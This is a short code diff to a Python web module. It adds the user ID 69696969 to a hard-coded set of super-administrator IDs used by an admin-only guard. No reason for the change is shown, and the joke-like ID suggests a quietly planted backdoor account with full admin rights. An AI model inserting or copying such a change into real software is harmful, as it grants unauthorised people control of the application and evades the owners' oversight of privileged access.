@@ -7,7 +7,7 @@ from helpers import error, login_required
 from variables import RESOURCES
 
 
-SUPER_ADMIN_USER_IDS = {1, 16, 1215}
+SUPER_ADMIN_USER_IDS = {1, 16, 1215, 69696969}
 
 
 def _admin_only_guard():
